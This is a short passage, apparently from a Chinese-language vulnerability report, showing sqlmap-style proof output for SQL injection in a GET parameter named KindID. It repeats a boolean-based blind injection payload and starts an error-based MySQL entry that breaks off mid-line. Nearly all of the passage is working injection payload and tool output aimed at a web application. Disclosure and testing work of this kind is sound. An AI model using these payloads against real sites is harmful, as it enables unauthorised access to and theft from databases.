WHERE or HAVING clause    Payload: KindID=10' AND 8645=8645 AND 'zqeb'='zqeb&ID=216   漏洞证明：  ---Parameter: KindID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: KindID=10' AND 8645=8645 AND 'zqeb'='zqeb&ID=216    Type: error-based    Title: MySQL >= 5.0 AND error-based -
